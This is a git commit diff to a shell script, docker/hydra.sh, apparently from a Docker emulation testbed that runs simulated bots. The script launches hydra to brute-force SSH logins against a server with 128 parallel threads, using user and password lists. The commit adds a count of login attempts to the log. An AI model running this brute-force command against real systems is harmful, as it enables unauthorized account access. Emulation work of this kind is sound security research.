ef97d3060ddafa3ace96b3210409a66258d8ea09
Marcos Cano <mcano@stsa.info>
2015-02-07 23:58:01 -0600

    Sat Feb  7 23:58:01 CST 2015

--- docker/hydra.sh
+++ docker/hydra.sh
@@ -2,9 +2,9 @@
 
 
 
-trap 'ls $name ; echo "[ENDING  $(date +%D-%T) ]" | tee -a $log_file; exit 0; ' SIGINT SIGTERM
+trap 'echo 'ATTEMPTS:' $( grep ATTEMPT ${name}.log |wc -l) |tee -a $log_file ; echo "[ENDING  $(date +%D-%T) ]" | tee -a $log_file; exit 0; ' SIGINT SIGTERM
 
-rm *.restore 2>/dev/null
+#rm *.restore 2>/dev/null
 
 log_dir="/var/log/dockemu"
 log_file=${1:-"$RANDOM"}
@@ -19,3 +19,6 @@ echo "[STARTING BOT-ID: $name $(date +%D-%T) ]" | tee -a $log_file
 sleep 1
 
 hydra -L /users -V -P /passwords -t 128 $server ssh | tee -a $name.log 
+
+
+echo 'ATTEMPTS:' $( grep ATTEMPT ${name}.log |wc -l) |tee -a $log_file ; echo "[ENDING  $(date +%D-%T) ]" | tee -a $log_file; exit 0;
